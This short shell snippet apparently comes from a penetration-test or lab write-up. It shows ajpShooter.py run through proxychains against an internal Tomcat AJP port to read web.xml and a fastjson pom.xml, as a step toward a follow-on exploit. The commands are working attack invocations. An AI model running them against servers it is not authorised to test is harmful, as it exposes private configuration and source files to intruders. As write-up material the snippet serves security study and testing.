```sh
root@kali-server:~# proxychains4 -q python3 ajpShooter.py http://172.30.12.236:8080 8009 /WEB-INF/web.xml read
# 找到         <servlet-class>com.remote.fastjson.LoginServlet</servlet-class>
root@kali-server:~# proxychains4 -q python3 ajpShooter.py http://172.30.12.236:8080 8009 /META-INF/maven/com.remote/fastjson/pom.xml read
```
